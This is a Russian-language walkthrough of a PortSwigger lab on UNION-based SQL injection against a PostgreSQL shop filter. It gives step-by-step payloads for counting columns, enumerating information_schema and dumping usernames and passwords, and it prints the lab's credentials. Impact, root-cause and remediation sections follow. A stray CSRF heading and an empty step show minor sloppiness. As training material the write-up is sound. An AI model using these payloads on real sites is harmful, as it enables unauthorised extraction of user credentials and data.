# SQL injection attack, listing the database contents on non-Oracle databases

**Категория:** SQL Injection
**Сложность лабы:** Practitioner
**Платформа:** PortSwigger Web Security Academy
**Тип уязвимости:** SQL injection attack, listing the database contents on non-Oracle databases
**Инструменты:** Burp Suite (Proxy, Repeater)
## Cross-site request forgery
---
## Цель

Приложение — интернет-магазин с категориями товаров. В этой лабораторной работе фильтр категорий товаров уязвим к SQL-инъекции. Результаты запроса отображаются в ответе приложения, поэтому вы можете использовать атаку типа UNION для извлечения данных из других таблиц.
В приложении предусмотрена функция входа в систему, а база данных содержит таблицу с именами пользователей и паролями. Вам необходимо определить название этой таблицы и входящие в нее столбцы, а затем извлечь содержимое таблицы, чтобы получить имена пользователей и пароли всех пользователей.
Для выполнения задания войдите в систему под учетной записью администратора.

## Описание уязвимости

Приложение формирует SQL-запрос на бэкенде примерно так:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```
Значение категории берётся из параметра запроса без должной валидации и подставляется напрямую в запрос. 

## Методология

### 1. Recon

Открыл каталог товаров, выбрал произвольную категорию (например, "Gifts") и через Burp Suite Proxy перехватил GET-запрос, отвечающий за фильтрацию:

```
GET /filter?category=Gifts HTTP/2
Host: 0a8600bf03bf8f0181729d8e003b0057.web-security-academy.net
```

### 2. Проверка инъекции

Отправил запрос в Burp Repeater. Добавил к значению `category` параметр, для проверки сколько столбцов в SQL-запросе, для понятия логики, сколько столбцов для ввода, перед тем как переходить к `UNION`-запросу. Остановился на том моменте, когда база стала выдавать `500 - Error`:

```
category=Gifts'+ORDER+BY+2--+-
```

Логика запроса на бэкенде превращается в:

```sql
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 2-- -' AND released = 1 
```

**Результат:**
```sql
Gifts ORDER BY 1-- - → 200 OK 
Gifts ORDER BY 2-- - → 200 OK 
Gifts ORDER BY 3-- - → Error
```
**Вывод:** запрос возвращает 2 колонки.
### 3. Отправка и проверка результата


## Payloads

```
category=Gifts'+UNION+SELECT+NULL,+version()--+-
```

Логика запроса на бэкенде превращается в:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, version()-- -' AND released = 1 
```

`
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu
`

Следующим шагом пытаемся из `information_schema.tables` вытащить нужные нам таблицы и отфлитровать через нужную колонку:

```sql
UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema ='public'--
```
**Результат:** `products`, `users_edaigm`

```sql
UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+%3d'users_edaigm'--+-
```
**Результат:** `email`, `username_wwntan`, `password_nxfzyp`

```sql
UNION+SELECT+username_wwntan ,+password_nxfzyp+FROM+users_edaigm+--+-
```
**Результат:**
**administrator :v2rdeejunh6ktpw9nlet**
wiener:wmruto3c202wrs6wxuzf 
carlos:4ym0sgg991hjn05kj8lq


## Результат

Вход выполнен под учётной записью `administrator` — лаборатория завершена.

### **Impact (Потенциальное влияние в реальном приложении)**

- **Несанкционированное извлечение данных (Data Exfiltration):** Возможность использования техники `UNION SELECT` позволяет злоумышленнику выгружать любые данные из базы, к которым имеет доступ учетная запись СУБД (включая системные таблицы, хэши паролей, персональные и финансовые данные клиентов).
- **Сбор информации об инфраструктуре (Reconnaissance / Fingerprinting):** Успешное чтение системного представления `version()` раскрывает точную версию СУБД и окружения, что упрощает подбор эксплойтов под специфические уязвимости конкретной сборки.
- **Обход логики фильтрации и ограничений доступа:** Отсечение условий вроде `AND released = 1` через комментарий позволяет получить доступ к скрытым, архивным или черновиковым записям каталога.
- **Эскалация атаки:** При наличии расширенных прав у служебной учетной записи СУБД возможны запись/чтение файлов на уровне операционной системы или выполнение системных команд. 

### **Root Cause (Первопричина)**

- **Небезопасная конкатенация строк:** Значение GET-параметра `category` напрямую встраивается в SQL-запрос на стороне бэкенда без использования параметризованных выражений (prepared statements / parameterized queries).
- **Отсутствие валидации и санитизации:** Сервер не проверяет входные данные по белому списку (allowlist) допустимых категорий и не экранирует специальные символы (одинарные кавычки `'`, символы комментариев `--`).
- Уязвимость возникает из-за прямой конкатенации пользовательского ввода в SQL-запрос без параметризации. Классический пример UNION-based атаки на PostgreSQL с использованием `information_schema` для энумерации схемы без предварительного знания структуры БД.
### **Remediation (Рекомендации по устранению)**

- **Использование параметризованных запросов (Prepared Statements):** Применять плейсхолдеры (bind variables) для всех параметров выборки — это гарантирует, что данные пользователя будут интерпретироваться СУБД исключительно как литерал, а не как исполняемый SQL-код.
- **Строгая валидация входных данных (Allowlist Validation):** Проверять значение параметра `category` на соответствие списку существующих категорий перед формированием запроса.
- **Принцип наименьших привилегий (Least Privilege):** Ограничить права пользователя БД, от имени которого работает веб-приложение: запретить доступ к системным представлениям (`vversion`, `information_schema.tables` и т.д.) и ограничить права только необходимыми таблицами (`SELECT` для каталога).
- **Корректная обработка ошибок (Error Handling):** Отключить вывод подробных сообщений об ошибках базы данных пользователю, чтобы не раскрывать структуру запросов и архитектуру СУБД (предотвращение Error-based разведки).
- **WAF (Web Application Firewall):** Настроить сигнатурный и поведенческий анализ для блокировки запросов с признаками инъекций (`UNION SELECT`, SQL-комментарии) в качестве дополнительного эшелона защиты.
- **Principle of Least Privilege for a database accoun:** Учётная запись, от имени которой приложение подключается к базе данных, не должна иметь доступ к `information_schema` и системным таблицам, если это не требуется бизнес-логике, и точно не должна иметь прав на чтение таблиц вроде `users` из контекста, не относящегося к аутентификации. Даже если инъекция всё же произойдёт, ограниченные привилегии снижают impact — атакующий не сможет вытащить всю схему базы или дойти до критичных таблиц.
